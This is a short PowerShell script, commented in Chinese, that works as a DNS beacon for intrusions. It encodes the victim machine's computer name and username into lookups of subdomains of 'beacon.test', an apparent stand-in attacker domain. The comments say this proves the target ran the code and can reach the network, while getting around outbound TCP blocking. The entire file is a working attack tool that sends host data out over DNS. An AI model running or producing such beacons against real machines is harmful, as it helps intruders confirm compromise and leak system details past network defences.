# beacon_dns.ps1 —— DNS 信标（最轻的出网证明，绕过出站 TCP 封禁）
# 原理：只做 DNS 解析，不建 TCP 连接。跳板起 dnsmasq/自研解析器记录查询即可确认"目标能出网且执行了代码"
param(
    [string]$Token = ($env:COMPUTERNAME.ToLower() -replace '[^a-z0-9]',''),
    [string]$Domain = 'beacon.test',
    [int]$Count = 3
)
for ($i=1; $i -le $Count; $i++) {
    $host_ = "{0}-{1}-{2}.{3}" -f $Token, $env:USERNAME.ToLower() -replace '[^a-z0-9]','', $i, $Domain
    try { [System.Net.Dns]::GetHostAddresses($host_) | Out-Null } catch {}
    Start-Sleep -Seconds 2
}
Write-Host "[+] beacon sent: $Count 次 -> $Domain"
